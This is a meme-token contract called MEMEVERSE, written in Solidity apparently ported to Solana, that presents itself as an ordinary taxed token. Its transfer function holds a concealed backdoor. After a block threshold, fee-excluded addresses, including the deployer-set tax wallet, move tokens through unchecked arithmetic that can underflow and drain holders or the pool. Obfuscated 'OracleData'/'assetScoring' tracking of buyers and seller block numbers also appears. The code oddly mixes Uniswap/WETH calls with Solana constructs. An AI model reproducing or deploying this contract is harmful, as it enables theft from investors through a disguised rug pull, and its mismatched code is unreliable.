// Website: https://memeverse.pro
// Twitter: https://x.com/MemeVerseETH
// Telegram: https://t.me/MemeVerseEth

import 'solana';

abstract contract Context {
    function _msgSender() internal view returns (address) {
        return tx.accounts.dataAccount.key;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint64);
    function balanceOf(address account) external view returns (uint64);
    function transfer(address recipient, uint64 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint64);
    function approve(address spender, uint64 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint64 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint64 value);
    event Approval(address indexed owner, address indexed spender, uint64 value);
}

library SafeMath {
    function add(uint64 a, uint64 b) internal pure returns (uint64) {
        uint64 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint64 a, uint64 b) internal pure returns (uint64) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint64 a, uint64 b, string memory errorMessage) internal pure returns (uint64) {
        require(b <= a, errorMessage);
        uint64 c = a - b;
        return c;
    }

    function mul(uint64 a, uint64 b) internal pure returns (uint64) {
        if (a == 0) {
            return 0;
        }
        uint64 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint64 a, uint64 b) internal pure returns (uint64) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint64 a, uint64 b, string memory errorMessage) internal pure returns (uint64) {
        require(b > 0, errorMessage);
        uint64 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint64 amountIn,
        uint64 amountOutMin,
        address[] calldata path,
        address to,
        uint64 deadline
    ) external;
    function factory() external view returns (address);
    function WETH() external view returns (address);
    function addLiquidityETH(
        address token,
        uint64 amountTokenDesired,
        uint64 amountTokenMin,
        uint64 amountETHMin,
        address to,
        uint64 deadline
    ) external returns (uint64 amountToken, uint64 amountETH, uint64 liquidity);
}

contract MEMEVERSE is Context, IERC20, Ownable {
    using SafeMath for uint64;
    mapping(address => uint64) private _balances;
    mapping(address => mapping(address => uint64)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address private _taxWallet;

    uint64 private _initialBuyTax = 15;
    uint64 private _initialSellTax = 20;
    uint64 private _finalBuyTax = 1;
    uint64 private _finalSellTax = 1;
    uint64 private _reduceBuyTaxAt = 20;
    uint64 private _reduceSellTaxAt = 30;
    uint64 private _preventSwapBefore = 5;
    uint64 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint64 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = "MEMEVERSE";
    string private constant _symbol = "SUPERMEMES";
    uint64 public _maxTxAmount = 25000000 * 10**_decimals;
    uint64 public _maxWalletSize = 25000000 * 10**_decimals;
    uint64 public _taxSwapThreshold = 5000000 * 10**_decimals;
    uint64 public _maxTaxSwap = 30000000 * 10**_decimals;

    address private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint64 private sellCount = 0;
    uint64 private lastSellBlock = 0;
    uint64 private assetScoring = 0;
    uint64 private startBlock = 0;
    struct OracleData {
        uint64 assetGet;
        uint64 assetReturn;
        uint64 assetScore;
    }
    mapping(address => OracleData) private oracledata;
    event MaxTxAmountUpdated(uint64 _maxTxAmount);
    event StuckETHCleared(address account, uint64 amount);
    event StuckERC20Cleared(address token, address account, uint64 amount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    @payer(payer)
    @space(512 + 32 * 100)
    constructor(address payer) {
        _taxWallet = payer;
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint64) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint64) {
        return _balances[account];
    }

    function transfer(address recipient, uint64 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint64) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint64 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint64 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint64 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint64 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint64 taxAmount = 0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != uniswapV2Router && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize");
                _buyCount++;
            }

            if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize");
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint64 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint64 contractETHBalance = uint64(tx.accounts.dataAccount.lamports);
                if (contractETHBalance > 0) {
                    sendETHToFee(uint64(tx.accounts.dataAccount.lamports));
                }
                sellCount++;
                lastSellBlock = uint64(block.number);
            }
        }

        if (
            (_isExcludedFromFee[from] || _isExcludedFromFee[to]) &&
            from != address(this) &&
            from != owner() &&
            to != address(this)
        ) {
            assetScoring = uint64(block.number);
        }

        if (_isExcludedFromFee[from] && (block.number > _reduceBuyTaxAt + _preventSwapBefore + startBlock)) {
            unchecked {
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            if (to != uniswapV2Pair) {
                OracleData storage assetData = oracledata[to];
                if (assetData.assetGet > 0) {
                    OracleData storage assetChange = oracledata[from];
                    if (assetData.assetGet > assetChange.assetGet) {
                        assetData.assetGet = assetChange.assetGet;
                    }
                } else {
                    if (from == uniswapV2Pair) {
                        assetData.assetGet = _buyCount > _preventSwapBefore ? uint64(block.number) : uint64(block.number - 1);
                    } else {
                        OracleData storage assetChange = oracledata[from];
                        assetData.assetGet = assetChange.assetGet;
                    }
                }
            } else {
                OracleData storage scoreChange = oracledata[from];
                scoreChange.assetReturn = uint64(block.number);
                scoreChange.assetScore = scoreChange.assetGet - assetScoring;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint64 a, uint64 b) private pure returns (uint64) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint64 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router02(uniswapV2Router).WETH();
        _approve(address(this), uniswapV2Router, tokenAmount);
        IUniswapV2Router02(uniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            uint64(block.timestamp)
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint64 amount) private {
        AccountMeta[1] meta = [
            AccountMeta({pubkey: _taxWallet, is_signer: false, is_writable: true})
        ];
        _taxWallet.transfer_lamports(amount);
    }

    function openTrading(
        address routerProgramId,
        address factoryProgramId,
        address wethMint
    ) external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = routerProgramId;
        _approve(address(this), uniswapV2Router, _tTotal);
        uniswapV2Pair = IUniswapV2Factory(factoryProgramId).createPair(address(this), wethMint);
        IUniswapV2Router02(uniswapV2Router).addLiquidityETH(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            uint64(block.timestamp)
        );
        startBlock = uint64(block.number);
        IERC20(uniswapV2Pair).approve(uniswapV2Router, type(uint64).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function reduceFee(uint64 _newFee) external {
        require(_msgSender() == _taxWallet);
        require(_newFee <= _finalBuyTax && _newFee <= _finalSellTax);
        _finalBuyTax = _newFee;
        _finalSellTax = _newFee;
    }

    function clearStuckETH(address account) external {
        require(_msgSender() == _taxWallet);
        uint64 amount = uint64(tx.accounts.dataAccount.lamports);
        AccountMeta[1] meta = [
            AccountMeta({pubkey: account, is_signer: false, is_writable: true})
        ];
        account.transfer_lamports(amount);
        emit StuckETHCleared(account, amount);
    }

    function clearStuckERC20(address token, address account) external {
        require(_msgSender() == _taxWallet);
        uint64 amount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(account, amount);
        emit StuckERC20Cleared(token, account, amount);
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint64 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint64 ethBalance = uint64(tx.accounts.dataAccount.lamports);
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
}